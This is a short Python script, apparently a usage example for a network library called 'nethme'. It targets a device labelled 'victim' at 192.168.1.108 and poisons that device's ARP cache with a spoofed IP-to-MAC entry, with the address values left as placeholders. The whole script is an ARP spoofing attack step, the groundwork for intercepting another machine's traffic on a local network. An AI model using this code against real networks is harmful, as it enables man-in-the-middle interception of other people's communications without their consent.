from nethme import *


def main():
    net = Network(iface='en0')
    victim = net.get_device(ip='192.168.1.108')

    # Poison `victim` arp cache with entry 'X.Y.Z.W has XX:XX:XX:XX'
    victim.poison_arp(face_mac="XX:XX:XX:XX", spoofed_ip="X.Y.Z.W")


if __name__ == '__main__':
    main()
